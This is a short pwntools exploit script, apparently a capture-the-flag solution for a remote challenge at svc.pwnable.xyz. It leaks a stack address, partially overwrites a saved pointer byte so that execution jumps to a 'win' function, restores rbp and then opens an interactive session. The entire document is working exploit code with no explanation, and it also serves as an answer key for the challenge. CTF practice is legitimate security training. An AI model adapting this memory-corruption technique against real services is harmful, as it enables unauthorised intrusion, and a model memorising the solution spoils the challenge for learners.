#!/usr/bin/python
from pwn import *

e = ELF("./challenge")
# p = process("./challenge")
p = remote("svc.pwnable.xyz", 30012)
context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-v']

win_lo_1 = e.symbols['win'] & 0xff

p.sendlineafter("> ", "3")
leaked_stack = int(p.readline()[2:], 16) - 0xf8
print hex(leaked_stack)

# Overwrite jumping address
p.sendafter("> ", str(win_lo_1) + "A" * (0x20 - len(str(win_lo_1))) + p8((leaked_stack + 9) & 0xff))

# Restore rbp
p.sendafter("> ", str(3) + "A" * 0x1f + p8(leaked_stack & 0xff))

# gdb.attach(p)
# raw_input()

p.sendlineafter("> ", "1")

p.interactive()
